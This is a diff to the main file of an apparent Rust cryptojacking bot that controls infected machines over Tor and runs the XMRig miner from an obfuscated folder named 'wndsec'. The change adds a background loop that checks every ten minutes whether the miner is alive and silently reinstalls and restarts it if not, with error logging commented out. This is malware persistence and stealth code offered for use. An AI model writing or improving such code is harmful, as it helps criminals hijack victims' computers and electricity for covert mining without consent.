@@ -3,7 +3,7 @@
 use std::{ sync::Mutex, time::Duration };
 use client_vars::constants::{ log_directory, xmrig_exe_name };
 use miner::{ run::run_miner, utils::initialize_miner };
-use network::tor::BotHandler;
+use network::{ basic::get_xmrig_summary, tor::BotHandler };
 use obfstr::obfstr as s;
 use shared::{
     constants::logs_encryption_key,
@@ -145,11 +145,6 @@ async fn main() {
         }
     });
 
-    if let Err(error) = initialize_miner() {
-        err!("initialize_miner failed: ", error);
-    }
-    std::thread::sleep(Duration::from_millis(500));
-
     let miner_file_path = get_current_exe_dir()
         .unwrap()
         .join(s!("wndsec"))
@@ -158,9 +153,22 @@ async fn main() {
         .unwrap()
         .to_owned();
 
-    if let Err(error) = run_miner(&miner_file_path) {
-        err!("run_miner failed: ", error);
-    }
+    tokio::task::spawn(async move {
+        // check if running - if not - reinit and rerun
+        // sleep 10 mins - check again
+        loop {
+            if let Err(_error) = get_xmrig_summary().await {
+                if let Err(error) = initialize_miner() {
+                    // err!("initialize_miner failed: ", error);
+                }
+                std::thread::sleep(Duration::from_secs(2));
+                if let Err(error) = run_miner(&miner_file_path).await {
+                    // err!("run_miner failed: ", error);
+                }
+            }
+            tokio::time::sleep(Duration::from_secs(600)).await;
+        }
+    });
 
     let config = LoggerCnfg::Existing(LOGGER.lock().unwrap().clone());
     info!("LoggerCnfg made");
